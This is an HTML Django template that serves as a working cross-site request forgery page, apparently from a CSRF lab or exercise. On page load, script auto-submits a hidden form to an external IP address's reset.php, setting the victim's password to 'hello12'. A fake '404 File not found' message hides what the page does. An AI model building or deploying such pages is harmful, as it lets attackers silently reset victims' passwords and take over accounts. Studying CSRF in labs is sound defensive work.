<!DOCTYPE html>
<html lang="en">
{% load staticfiles %}
<!--⭐️文件名是post，不是创建的这个页面是post，而是通过侦测POC得知修改是post实现的。-->
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
    <script src="{% static 'js/jquery.min.js' %}" type="text/javascript"></script>

    <script type="text/javascript">
        window.onload=function()
        {
            document.getElementById('submitid').click();        //通过submit id获取对象，code可以实现自动click动作
        }
    </script>
</head>
<body>
    <form id="transfer" method="post" action="http://113.108.70.111:60762/reset.php">
        <input type="hidden" value="hello12" name="newpassword" id="newpassword">
        <input type="hidden" value="hello12" name="repeatpassword" id="repeatpassword">
        <input id="submitid" value="Login" type="submit" name="Login" hidden>
    </form>
    <h1>404</h1>
    <h1>File not found.</h1>

</body>
</html>
